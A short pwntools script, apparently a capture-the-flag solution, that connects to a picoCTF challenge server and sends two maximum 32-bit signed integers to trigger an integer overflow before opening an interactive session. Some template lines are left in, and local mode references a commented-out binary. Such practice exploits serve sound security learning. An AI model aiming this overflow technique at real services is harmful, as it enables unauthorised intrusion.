#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 61018
HOST = "saturn.picoctf.net"
# exe = context.binary = ELF('./filebin', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

n1 = pow(2, 31)-1
n2 = pow(2, 31)-1

p.sendlineafter(b"possible: \n", f"{n1}\n{n2}")

p.interactive()
